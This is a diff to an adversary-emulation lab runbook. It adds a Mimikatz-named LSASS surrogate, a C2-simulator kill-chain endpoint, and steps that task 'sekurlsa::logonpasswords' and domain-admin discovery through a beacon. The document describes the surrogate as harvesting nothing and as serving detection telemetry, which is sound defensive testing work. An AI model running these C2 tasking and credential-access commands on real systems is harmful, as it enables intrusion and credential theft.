@@ -25,6 +25,7 @@ credentials only via prompt/runas — never on a command line or in logs.
 |---|---|---|
 | Session-1 chain (S1–S3 re-run) | `payloads/hta/bootstrap.hta`, `payloads/beacon/c0015_beacon.ps1`, `payloads/dll/c0015_bootstrap_dll.c`, `payloads/docm/macro_payload.vba` | `payloads/packaging/build_dll.sh` → `build/out/c0015-comparefor.jpg`; `make_config.ps1` (full task map) |
 | **143.dll surrogate (S8/S9)** — NEW | `payloads/dll/c0015_143_surrogate.c` | `x86_64-w64-mingw32-gcc -shared -o c0015_143_surrogate.dll payloads/dll/c0015_143_surrogate.c -luser32 -lshlwapi` (on Kali) |
+| Mimikatz-shaped LSASS surrogate (**S7b**, NEW) | `payloads/lsass/c0015_mimikatz_surrogate.c` | `x86_64-w64-mingw32-gcc -O2 -o mimikatz.exe payloads/lsass/c0015_mimikatz_surrogate.c -luser32` (Kali) → stage `C:\Tools\mimikatz.exe` on WS01 |
 | phase7 config (FS01) | `payloads/config/c0015-phase7.example.ini` → fill `run_id` | staged to `C:\C0015\config-phase7.ini` in S8a |
 | C2-SIM v3 | `scripts/c2sim_v2.py` — dynamic tasking via `POST /cmd` (operator benign commands; queue priority) + phase3 batch + phase7-session2 receipt | `python scripts/c2sim_v2.py --ip 192.168.50.1 --port 8080 --ledger evidence/run-ledger --log c2sim.log` |
 
@@ -68,6 +69,8 @@ Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "tasklist /s lo
 # micro-manage the burst like the DFIR operator; typo/copy-paste variation is itself a
 # runbook signature (seen in the source), so vary the command strings on purpose
 Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "net group `"domain admins`" /dom"
+# ...or let the ORDERED kill chain play through the beacon sequentially (v3.1 runbook):
+Invoke-RestMethod -Method Post -Uri "$c2/runbook?session=$tok&name=c0015-phase2"
 ```
 Results appear as `result ... task=OP-CMD ...` in `c2sim.log`; the beacon sleeps
 `loop_sleep_sec ± loop_sleep_jitter_sec` between rounds (v3 cadence). Raise `loop_count` while shepherding.
@@ -122,6 +125,25 @@ python scripts/lab_tools.py artifact-new ART-05-01 RUN-20260928-02 5 6 --payload
 Elastic: WS01 S4648 (explicit credential); FS01 S4624 T3 + S4672 joined by **FS01 LogonId** (never 4648↔4624 by
 LogonId); S4625 for A/C. Note: the IPC$ session does **not** change the process token — S8b must re-supply the
 credential explicitly.
+
+## 5b. S7b — credential-access simulation (LSASS, Mimikatz-shaped surrogate)
+
+Payload: `payloads/lsass/c0015_mimikatz_surrogate.c` → `mimikatz.exe` staged to `C:\Tools\mimikatz.exe` on
+WS01 (masquerade name = enrichment only). Tasked through the beacon (single `/cmd` or the v3.1 runbook entry):
+```powershell
+Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "C:\Tools\mimikatz.exe sekurlsa::logonpasswords /out:C:\C0015\lsass.dmp"
+```
+What it does (LAB SURROGATE — **no credential material is read or stored**):
+- E1 with `Image = mimikatz.exe` + `sekurlsa::logonpasswords` command line (parent = beacon powershell)
+- **E10 ProcessAccess**: `OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ)` on `lsass.exe` → real
+  high-access-mask telemetry (BALANCED profile includes `lsass.exe` targets)
+- E11: decoy `C:\C0015\lsass.dmp` (benign bytes)
+
+Evidence: WS01 E10 (target `lsass.exe`, GrantedAccess ≈ `0x1FFFFF`, source = beacon child) + E11 + banner result in
+`c2sim.log`. This generates the plausibility telemetry DFIR attributes to Process Hacker/LSASS
+(`[INFERRED-C0015]`; provenance `[UNKNOWN-C0015]` stays recorded) — the actual WMI identity at S8 is STILL the
+operator prompt; the simulation harvests nothing.
+Rollback: delete `C:\Tools\mimikatz.exe` + `C:\C0015\lsass.dmp`.
 
 ## 6. S8a — tool handoff (T1570 surrogate; WS01 → FS01 C$)
 
